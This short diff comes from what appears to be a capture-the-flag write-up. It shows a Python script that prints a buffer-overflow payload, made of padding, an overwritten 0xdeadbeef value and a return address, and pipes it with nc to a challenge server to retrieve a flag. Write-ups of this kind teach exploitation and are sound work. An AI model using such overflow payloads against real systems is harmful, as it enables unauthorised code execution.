@@ -82,8 +82,8 @@ BM02_13.PNG\
 ```python
 print("add_candidate")
 print('A'*120 + '\xef\xbe\xad\xde' + 'A'*12 + '\x5d\x61\x55\x56')
-print("last name")
-print("job title")
+print("Last")
+print("Title")
 ```	
 * Send the bm02.py to the server and it would prints out the flag.
   * `python bm02.py | nc bm02.allyourbases.co 9003`
